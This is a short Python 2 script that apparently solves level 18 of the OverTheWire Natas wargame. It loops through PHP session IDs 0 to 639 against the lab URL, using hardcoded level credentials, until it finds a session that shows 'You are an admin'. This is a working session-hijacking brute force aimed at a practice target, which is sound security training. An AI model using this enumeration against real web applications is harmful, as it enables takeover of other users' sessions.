import requests

URL = "http://natas18.natas.labs.overthewire.org/?username=a&password=a&debug"
PHPSESSID = "PHPSESSID"
CREDS = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

SUCCESS = "You are an admin"

cookie = {PHPSESSID: 0}

s = requests.Session()
s.auth = CREDS

for i in xrange(640):
	cookie[PHPSESSID] = str(i)
	data = s.get(URL, cookies=cookie).text
	
	if SUCCESS in data:
		print "SESSID: %s" % str(i)
		print data
		break

